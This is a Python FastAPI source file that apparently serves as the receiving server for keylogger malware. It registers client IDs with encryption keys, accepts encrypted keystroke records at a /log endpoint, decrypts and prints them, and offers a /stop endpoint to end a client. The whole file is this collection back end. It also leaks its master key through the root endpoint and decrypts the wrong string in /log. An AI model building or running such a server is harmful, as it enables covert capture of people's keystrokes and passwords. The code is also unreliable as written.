import os
import json
from pydantic import BaseModel
from cryptography.fernet import Fernet
from fastapi import FastAPI, HTTPException


app = FastAPI()
PATH = 'database.json'
KEY =  Fernet.generate_key()

class DataEncrypted(BaseModel):
    data: str

class Application(BaseModel):
    id: str
    encrytion_key: str

class KeyLog(BaseModel):
    word: str
    timestamp: float

def cipher(data: str, key: str, encrypt: bool = True) -> str:
    
    cipher_suite = Fernet(key)
    
    if encrypt:
        # Encrypt the token using the Fernet cipher suite
        data = json.dumps(data)
        encrypted_token = cipher_suite.encrypt(data.encode('utf-8'))
        return encrypted_token.decode('utf-8')
    else:
        # Decrypt the token using the Fernet cipher suite
        encrypted_token = cipher_suite.decrypt(data.encode('utf-8'))
        data = json.loads(encrypted_token.decode('utf-8'))
        return data

def create_key(id: str, key: str):
    
    if not os.path.exists(PATH):
        with open(PATH, 'w') as f:
            json.dump({}, f, indent=4)
            f.close()
            
    with open(PATH, 'r+') as f:
        data = json.load(f)
        data[id] = {
            "key": key,
            "status": True
        }
        f.seek(0)
        json.dump(data, f, indent=4)
        f.truncate()
        f.close()


def get_key(id: str):
    
    with open(PATH, 'r') as f:
        data = json.load(f)
        if id in data:
            if data[id]["status"]:
                return data[id]['key'].encode('utf-8')
            else:
                return None
        else:
            return None

@app.get("/")
async def ping():
    return {"data": KEY.decode('utf-8')}

@app.post("/register")
async def register(application: DataEncrypted):
    data: Application = Application(**cipher(application.data, KEY, False))
    create_key(data.id, data.encrytion_key)
    return

@app.post("/log")
async def get_key_log(key_log: DataEncrypted):
    
    data, id = key_log.data.split('?')
    print(data, id)
    key = get_key(id)
    if key:
        data: KeyLog = cipher(key_log.data, key, False)
        print(data)
        return
    else:
        print("The program is stopping")
        raise HTTPException(status_code=400, detail="End of the process")

@app.delete("/stop/{id}")
async def stop(id:str):
    with open(PATH, 'r+') as f:
        data = json.load(f)
        del data[id]
        f.seek(0)
        json.dump(data, f, indent=4)
        f.truncate()
        f.close()
    print("The program is stopping")
    return

"""
comand to run:
uvicorn main:app --reload
"""